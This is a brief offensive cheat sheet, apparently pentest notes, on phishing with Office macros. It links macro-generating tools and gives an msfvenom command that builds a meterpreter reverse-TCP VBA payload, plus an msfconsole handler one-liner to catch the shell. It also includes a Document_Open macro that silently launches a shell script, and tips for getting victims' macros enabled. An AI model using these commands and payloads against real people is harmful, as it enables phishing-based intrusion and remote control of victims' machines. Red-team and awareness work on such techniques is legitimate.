# Email Phishing with Macros

## Macro Creation Tools

Powershell script to create an Excel file with malicious macro:
- https://gist.github.com/luca-m/6ee176881a1d93bcddb3

Malicious Macro generator utility (will create VBA files):
- https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator


## Manually
Create a VBA payload:
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP/HOST> LPORT=<PORT> -f vba`

Paste into the macro module, save and ensure that the file gets accepted. Then, on the attacker machine:
`msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost <IP/HOST>;set lport <PORT>;run"`


## VBA Examples

Very simple macro:
```
Private Sub Document_Open()
  MsgBox "Data is revealed.", vbOKOnly, "Data is revealed."
  a = Shell("C:\tools\shell.cmd", vbHide)
End Sub
```


https://medium.com/@mavrogiannispan/phishing-2-0-9f49654de4a6

## THINGS TO ENSURE:
- excel account settings -> trust & security center -> enable macros
- file explorer -> properties -> unblock file
- also macros can now only be triggered in the licensed version of office, active content is not enabled on the free version
  
